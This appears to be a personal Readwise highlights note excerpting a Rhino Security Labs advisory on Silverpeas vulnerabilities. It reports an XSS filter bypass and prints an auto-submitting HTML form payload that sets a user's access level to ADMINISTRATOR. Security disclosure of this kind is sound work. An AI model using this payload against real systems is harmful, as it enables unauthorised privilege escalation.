---
author: Rhino Security Labs
aliases:
  - "Silverpeas App: Multiple CVEs Leading to File Read on Server"
tags:
  - readwise/articles
url: https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/
created: 2024-08-20
---
# Silverpeas App: Multiple CVEs Leading to File Read on Server

![rw-book-cover](https://rhinosecuritylabs.com/wp-content/uploads/2023/12/banner.png)

## Highlights


Silverpeas checks for Cross-Site Scripting by filtering out `<script>` tags in messages. This check can be bypassed by performing XSS without using `<script>` tags.
[View Highlight](https://read.readwise.io/read/01hhg2ej83d5css0fqfe237b27)



![](https://rhinosecuritylabs.com/wp-content/uploads/2023/12/Image2-500x218.png "Image2")
[View Highlight](https://read.readwise.io/read/01hhg2em9xqcy3c5fxa0yjpf84)



the following payload will successfully execute Javascript that elevates the adversary’s permissions: 
```html
 <html><body onload="document.forms[0].submit();"><form action="http://localhost:8080/silverpeas/RjobDomainPeas/jsp/userModify" method="GET"><input type="hidden" name="Iduser" value="[userID]" /><input type="hidden" name="userLastName" value="[userLastName]" /><input type="hidden" name="userAccessLevel" value="ADMINISTRATOR" /><input type="hidden" name="X-STKN" value="[userSTKNToken]" /></form></body></html>
```
[View Highlight](https://read.readwise.io/read/01hhg2gwf72y9821jrfd2rr0ha)

